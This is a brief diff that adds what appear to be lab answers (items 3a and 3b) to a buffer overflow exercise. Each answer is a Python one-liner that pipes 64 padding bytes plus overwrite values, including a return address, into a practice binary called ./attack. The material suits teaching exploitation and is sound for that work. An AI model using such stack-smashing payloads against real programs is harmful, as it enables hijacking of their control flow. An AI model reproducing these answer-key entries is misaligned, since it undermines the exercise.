@@ -1,0 +1,5 @@
+Var1CD
+
+3a                                    python -c 'print 64 * "A" + "\xbe\xba\xfe\xca"' | ./attack 
+
+3 b					python -c 'print 64 * "A" + "\xbe\xba\xfe\xca" + 4 * "A" + "\x18\x93\x04\x08"' | ./attack 
